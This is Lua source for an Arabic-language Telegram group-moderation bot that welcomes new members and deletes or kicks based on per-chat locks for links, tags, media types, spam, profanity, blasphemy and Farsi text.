if DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_) then
text = DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'CXRCX'))
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     SoUrCe BrAnD     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = BrAnD,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(BrAnD) then 
if DevBrAnD:sismember(BrAnD..'BrAnD:Groups',msg.chat_id_) then
BotText = "مفعله في السابق\n♰ ⌯ ارسل ↫ الاوامر واستمتع بالمميزيات"
else 
BotText = "معطله يجب رفعي مشرف\n♰ ⌯ بعد ذلك يرجى ارسال امر ↫ تفعيل\n♰ ⌯ سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
local BrAnDText = (DevBrAnD:get(BrAnD.."BrAnD:Text:BotWelcome") or "♰ ⌯ مرحبا انا بوت اسمي "..NameBot.."\n♰ ⌯ حالة المجموعه ↫ "..BotText.."\n⍆═════BR═════⍅")
local BrAnDPhoto = (DevBrAnD:get(BrAnD.."BrAnD:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if DevBrAnD:get(BrAnD.."BrAnD:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,BrAnDPhoto,BrAnDText)
else 
send(msg.chat_id_,msg.id_,BrAnDText)
end 
end   
end
end,nil)
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Welcome"..msg.chat_id_) then
if DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_) then
text = DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'CXRCX'))
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     SoUrCe BrAnD     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Contact]")
end
end
--     SoUrCe BrAnD     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     SoUrCe BrAnD     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     SoUrCe BrAnD     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Location]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     SoUrCe BrAnD     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Video]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     SoUrCe BrAnD     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     SoUrCe BrAnD     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Text]")
end
if msg.content_.text_:match("@") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local BrAnD = 'BrAnD:Spam:Text'..msg.chat_id_
if not DevBrAnD:get(BrAnD..BrAnD) then
sens = 400
else
sens = tonumber(DevBrAnD:get(BrAnD..BrAnD))
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Text]")
end
end
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."BrAnD:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"♰ ⌯ تم الغاء حفظ الرابط")       
DevBrAnD:del(BrAnD.."BrAnD:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_,Link)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ الرابط بنجاح', 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end
--     SoUrCe BrAnD     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevBrAnD:get('BrAnDTEAM:'..BrAnD.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevBrAnD:del('BrAnDTEAM:'..BrAnD..'id:user'..msg.chat_id_)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء الامر', 1, 'md')
DevBrAnD:del('BrAnDTEAM:'..BrAnD.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevBrAnD:del('BrAnDTEAM:'..BrAnD.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevBrAnD:get('BrAnDTEAM:'..BrAnD..'id:user'..msg.chat_id_)  
DevBrAnD:incrby(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_BrAnD(msg.chat_id_, msg.id_,  1, "♰ ⌯ تم اضافة "..numadded..' رساله', 1, 'md')
DevBrAnD:del('BrAnDTEAM:'..BrAnD..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevBrAnD:get('BrAnDTEAM:'..BrAnD.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevBrAnD:del('BrAnDTEAM:'..BrAnD..'ids:user'..msg.chat_id_)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء الامر', 1, 'md')
DevBrAnD:del('BrAnDTEAM:'..BrAnD.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevBrAnD:del('BrAnDTEAM:'..BrAnD.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevBrAnD:get('BrAnDTEAM:'..BrAnD..'ids:user'..msg.chat_id_)  
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_BrAnD(msg.chat_id_, msg.id_,  1, "♰ ⌯ تم اضافة "..numadded..' نقطه', 1, 'md')
DevBrAnD:del('BrAnDTEAM:'..BrAnD..'ids:user'..msg.chat_id_)  
end
end
--     SoUrCe BrAnD     --
if text:match("طيز") or text:match("ديس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
if not DevBrAnD:get(BrAnD.."BrAnD:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا عزيزي ↫ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'CXRCX')..') \n♰ ⌯ ممنوع الفشار في المجموعه', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     SoUrCe BrAnD     --
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا عزيزي ↫ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'CXRCX')..') \n♰ ⌯ ممنوع التكلم بالغه الفارسيه هنا', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevBrAnD:get(BrAnD.."BrAnD:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
--     SoUrCe BrAnD     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if not DevBrAnD:get(BrAnD.."BrAnD:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
